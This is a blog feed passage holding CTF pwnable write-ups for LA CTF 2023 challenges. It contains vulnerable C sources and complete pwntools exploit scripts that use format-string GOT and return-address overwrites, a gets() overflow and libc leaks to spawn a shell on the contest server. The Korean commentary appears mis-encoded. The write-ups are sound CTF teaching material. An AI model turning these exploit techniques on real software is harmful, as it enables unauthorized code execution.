        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>Make your own custom rickroll with my new rickroll program!<br><code>nc lac.tf 31135</code></p></blockquote><ul><li>[90 solves &#x2F; 449 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> main_called = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (main_called) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;nice try&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    main_called = <span class="number">1</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Lyrics: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    fgets(buf, <span class="number">256</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Never gonna give you up, never gonna let you down\nNever gonna run around and &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Never gonna make you cry, never gonna say goodbye\nNever gonna tell a lie and hurt you\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì†ŒìŠ¤ì½”ë“œê°€ ê°„ë‹¨í•˜ë‹¤. fsbê°€ í„°ì§„ë‹¤. ë‹¤ë§Œ ìµìŠ¤í•  ë•Œ ì£¼ì˜í•´ì•¼ í•  ì ì€ mainì„ ë‹¤ì‹œ ì‹¤í–‰ì‹œí‚¬ ë•Œ <code>main_called</code>ì„ ë‹¤ì‹œ 0ìœ¼ë¡œ ì„¸íŒ…í•´ì¤˜ì•¼ í•œë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>main_called</code>ì„ 0ìœ¼ë¡œ ì„¸íŒ…í•˜ê³  <code>puts@got</code>ë¥¼ <code>main</code>ìœ¼ë¡œ overwrite -&gt; <code>main_called</code>ë§Œ 0ìœ¼ë¡œ ì„¸íŒ…í•´ì¤€ë‹¤ë©´ ì´ì œ ê³„ì† mainì´ ë°˜ë³µí•´ì„œ ì‹¤í–‰ë¨</li><li>libc leak ë° <code>main_called</code>ì„ 0ìœ¼ë¡œ ì„¸íŒ… </li><li><code>main_called</code>ì„ 0ìœ¼ë¡œ ì„¸íŒ…í•˜ê³  <code>printf@got</code>ì„ <code>system</code>ë¡œ overwrie </li><li>â€˜&#x2F;bin&#x2F;sh\x00â€™ì„ ìž…ë ¥</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rickroll&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31135</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rickroll&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># for i in range(1, 80):</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># offset 6</span></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += fmtstr_payload(<span class="number">6</span>, &#123;</span><br><span class="line">        e.sym[<span class="string">&#x27;main_called&#x27;</span>] : p8(<span class="number">0</span>),</span><br><span class="line">        e.got[<span class="string">&#x27;puts&#x27;</span>] : e.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    i = <span class="number">11</span></span><br><span class="line">    info(<span class="built_in">hex</span>(i))</span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span> </span><br><span class="line">    payload += <span class="string">b&#x27;%8$hhn__&#x27;</span> <span class="comment"># 6</span></span><br><span class="line">    payload += <span class="string">b&#x27;%11$p&#x27;</span> <span class="comment">#+ i.to_bytes(1, &#x27;big&#x27;) + b&#x27;$p&#x27;    # 7 16</span></span><br><span class="line">    payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">16</span>-<span class="built_in">len</span>(payload)) <span class="comment"># padding</span></span><br><span class="line">    payload += p64(e.sym[<span class="string">&#x27;main_called&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;0x&#x27;</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">    libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x53d9b</span></span><br><span class="line">    info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += fmtstr_payload(<span class="number">6</span>, &#123;</span><br><span class="line">        e.sym[<span class="string">&#x27;main_called&#x27;</span>] : p8(<span class="number">0</span>),</span><br><span class="line">        e.got[<span class="string">&#x27;printf&#x27;</span>] : libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    pause()</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;cs:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">    <span class="built_in">print</span>(ex)</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="comment"># p = process(&#x27;./rickroll&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31135</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ë„ì»¤íŒŒì¼ì´ ì œê³µë˜ì—ˆìŒì—ë„ ë¡œì»¬ê³¼ ë¦¬ëª¨íŠ¸ í™˜ê²½ì„ ë˜‘ê°™ì´ ë§žì¶°ì£¼ì§€ ì•Šê³  ë¡œì»¬ì—ì„œ ë¨¼ì € ì‰˜ì„ íšë“í•˜ê³  ë¦¬ëª¨íŠ¸ë¥¼ ì‹¤í–‰í–ˆ. ë‹¹ì—°ížˆ ì‹¤íŒ¨í–ˆë‹¤. ã…‹ ê·¸ëž˜ì„œ ëŒ€ì¶© ë¸Œí¬ë¡œ leak ì˜¤í”„ì…‹ ë§žì¶°ì£¼ë ¤ê³  í–ˆëŠ”ë° ìž˜ ì•ˆë˜ì–´ì„œ ê·¸ëƒ¥ patchelf í•´ì¤˜ì„œ ë¬¸ì œë¥¼ í’€ì—ˆë˜ ê¸°ì–µì´ ë‚œë‹¤. </p><p>ë„ì»¤íŒŒì¼ì´ ì œê³µë˜ë©´.. í™˜ê²½ë¶€í„° ë§žì¶°ì£¼ëŠ”ê²Œ ëœ ê·€ì°®ì€ ê²ƒì„ ê¹¨ë‹¬ì•˜ë‹¤.</p><p>ê·¸ë¦¬ê³  <code>fmtstr_payload</code>ì€ ë™ì‹œì— ì—¬ëŸ¬ê°œ ë®ì„ ìˆ˜ ìžˆë‹¤ëŠ” ì ê³¼ payloadë¥¼ êµ¬ì„±í•  ë•Œ ì € í•¨ìˆ˜ë§Œ ë‹¨ë…ìœ¼ë¡œ ì¨ì¤˜ì•¼í•˜ëŠ” ê²ƒì„ ê¹¨ë‹¬ì•˜ë‹¤.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;printf_gave_me_up_and_let_me_down&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - rut-roh-relro (RELRO)</title>
      <link href="/230215-lactf2023-rut-roh-relro/"/>
      <url>/230215-lactf2023-rut-roh-relro/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><blockquote><p>My friend keeps writing super insecure C programs but Iâ€™m too lazy to fix his code. Iâ€™m sure itâ€™ll be fine as long as I use enough exploit mitigations, right?<br><code>nc lac.tf 31180</code></p></blockquote><ul><li>[70 solves &#x2F; 462 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>Full Relro!! NX and PIE are enabled.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What would you like to post?&quot;</span>);</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your latest post:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWhat would you like to post?\n&quot;</span>);</span><br><span class="line">    fgets(buf, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nYour free trial has expired. Bye!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can find twice fsb.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li>leak libc, stack, pie &#x2F; <code>ret2main</code> (Overwrite the ret in stack to <code>main</code>)</li><li>Overwrite the ret in stack to <code>system</code> &#x2F; Overwrite the <code>rdi</code> to â€˜&#x2F;bin&#x2F;sh\x00â€™</li></ol><p>The <code>rdi</code> is in the writeable space. You know the libc address. Got the offset during debugging and overwrite it.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rut_roh_relro&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;lac.tf&#x27;</span>, <span class="number">31134</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./rut_roh_relro&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc,stack,pie</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%71$p%68$p%63$p&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x23d0a</span></span><br><span class="line">info(<span class="string">&#x27;libc address &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack &#x27;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">ret = stack - <span class="number">0xe8</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x1265</span></span><br><span class="line">info(<span class="string">&#x27;pie address &#x27;</span> + <span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># og = [0xc961a, 0xc961d, 0xc9620]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;ret : e.symbols[<span class="string">&#x27;main&#x27;</span>]&#125;)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">###### (2) ######</span></span><br><span class="line">ret = stack - <span class="number">0xe0</span></span><br><span class="line">rdi = libc.address + <span class="number">0x1d1990</span></span><br><span class="line">info(<span class="built_in">hex</span>(ret))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;ret : libc.symbols[<span class="string">&#x27;system&#x27;</span>]&#125;)</span><br><span class="line">payload += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">6</span>, &#123;rdi : <span class="string">b&#x27;/bin/sh\x00&#x27;</span>&#125;)</span><br><span class="line">payload += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>I want to use the one gadget, but I canâ€™t. :( I have no choice to do honestly. Run the <code>system(&#39;/bin/sh\x00&#39;)</code> :).</p><p>But Some people use that gadget.. good.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;maybe_ill_add_asan_for_good_measure&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
        <tags>
            
            <tag> relro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>La CTF 2023 - gatekeep</title>
      <link href="/230214-lactf2023-gatekeep/"/>
      <url>/230214-lactf2023-gatekeep/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1732">https://ctftime.org/event/1732</a></li></ul><p>pwnable ë¬¸ì œë„ ë§Žê³  ë„ˆë¬´ ìž¬ë°ŒëŠ” ì”¨í…ì´ì—ˆë‹¤. ë‚´ê°€ ë´¤ë˜ ë¬¸ì œë“¤ì—ëŠ” ë„ì»¤íŒŒì¼ê³¼ ì†ŒìŠ¤ì½”ë“œë¥¼ ì œê³µí•´ì£¼ì—ˆë‹¤.</p><blockquote><p>If I gaslight you enough, you wonâ€™t be able to get my flag! :)<br><code>nc lac.tf 31121</code></p></blockquote><ul><li>[529 solves &#x2F; 138 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ì¹œì ˆí•˜ê²Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_flag</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    FILE* flagfile = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (flagfile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Cannot read flag.txt.&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        fgets(flag, <span class="number">256</span>, flagfile);</span><br><span class="line">        flag[<span class="built_in">strcspn</span>(flag, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">puts</span>(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">check</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> input[<span class="number">15</span>];</span><br><span class="line">    <span class="type">char</span> pass[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> access = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If my password is random, I can gatekeep my flag! :)</span></span><br><span class="line">    <span class="type">int</span> data = open(<span class="string">&quot;/dev/urandom&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (data &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Can&#x27;t access /dev/urandom.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ssize_t</span> result = read(data, pass, <span class="keyword">sizeof</span> pass);</span><br><span class="line">        <span class="keyword">if</span> (result &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Data not received from /dev/urandom\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(data);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password:\n&quot;</span>);</span><br><span class="line">    gets(input); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(input, pass)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I swore that was the right password ...\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        access = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(access) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Guess I couldn&#x27;t gaslight you!\n&quot;</span>);</span><br><span class="line">        print_flag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If I gaslight you enough, you won&#x27;t be able to guess my password! :)\n&quot;</span>);</span><br><span class="line">    check();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gets</code> í•¨ìˆ˜ëŠ” BOFê°€ ì¼ì–´ë‚  ê°€ëŠ¥ì„±ì´ ì¡´ìž¬í•œë‹¤. <code>/dev/urandom</code>ì—ì„œ ì½ì–´ì˜¨ ê°’ì€ ê°’ì„ leakí•˜ëŠ” ê±° ì•„ë‹Œ ì´ìƒ ì •í™•í•œ ê°’ì„ ì•Œ ìˆ˜ê°€ ì—†ê¸° ë•Œë¬¸ì— <code>strcmp(input, pass)</code>ì„ ìš°íšŒí•˜ì—¬ <code>access</code>ë¥¼ 1ë¡œ ì„¸íŒ…í•´ì¤˜ì•¼í•˜ëŠ” ë°©ë²•ì„ ìƒê°í•´ì•¼ í•œë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>a</code>ë¥¼ ë§Žì´ ë³´ë‚´ì£¼ë‹ˆ <code>print_flag</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë˜ì–´ í”Œëž˜ê·¸ë¥¼ íšë“í•  ìˆ˜ ìžˆì—ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[jir4vvit@arch gatekeep]$ nc lac.tf 31121</span><br><span class="line">aIf I gaslight you enough, you won&#x27;t be able to guess my password! :)</span><br><span class="line">Password:</span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">I swore that was the right password ...</span><br><span class="line">Guess I couldn&#x27;t gaslight you!</span><br><span class="line">lactf&#123;sCr3am1nG_cRy1Ng_tHr0w1ng_uP&#125;</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf&#123;sCr3am1nG_cRy1Ng_tHr0w1ng_uP&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> La </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>(author) Winter HackingCamp CTF 2023 - syscall (SROP)</title>
      <link href="/230211-hcamp2023w-syscall/"/>
      <url>/230211-hcamp2023w-syscall/</url>
      
